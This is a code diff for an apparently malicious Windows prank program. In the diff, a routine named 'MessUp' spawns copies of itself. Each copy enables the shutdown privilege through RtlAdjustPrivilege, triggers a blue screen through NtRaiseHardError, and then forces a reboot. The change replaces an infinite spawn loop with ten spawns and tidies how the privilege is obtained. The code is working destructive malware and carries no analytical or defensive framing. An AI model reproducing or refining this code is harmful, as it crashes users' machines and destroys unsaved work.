@@ -215,7 +215,7 @@ void MessUp()
 	si.cb = sizeof(si);
 	RtlZeroMemory(&pi, sizeof(pi));
 
-	while (true)
+	for (int i = 0; i < 10; i++)
 		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
 }
 
@@ -234,21 +234,15 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		}
 		else if (lstrcmpA(__argv[1], "lol") == 0)
 		{
-			HANDLE token;
-			TOKEN_PRIVILEGES privileges;
+			auto RtlAdjustPrivilege = (void(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(LoadLibraryA("ntdll"), "RtlAdjustPrivilege");
 
-			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+			BOOLEAN wasEnabled;
+			RtlAdjustPrivilege(19, 1, 0, &wasEnabled); //Adjust shutdown privilege
 
-			LookupPrivilegeValueW(0, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
-			privileges.PrivilegeCount = 1;
-			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-			AdjustTokenPrivileges(token, 0, &privileges, 0, (PTOKEN_PRIVILEGES)0, 0); //Get shutdown privilege
-
-			FARPROC NtRaiseHardError = GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");
+			auto NtRaiseHardError = (void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))GetProcAddress(LoadLibraryA("ntdll"), "NtRaiseHardError");
 
 			ULONG response;
-			((void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))NtRaiseHardError)(0xC0000001, 0, 0, 0, 6, &response); //Trigger BSoD
+			NtRaiseHardError(0xC0000001, 0, 0, 0, 6, &response); //Trigger BSoD
 
 			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN); //In case it didn't work, restart Windows
 
@@ -276,6 +270,4 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	stop = true;
 
 	MessUp(); //Mess up Windows
-
-	while (true); //Hang
 }
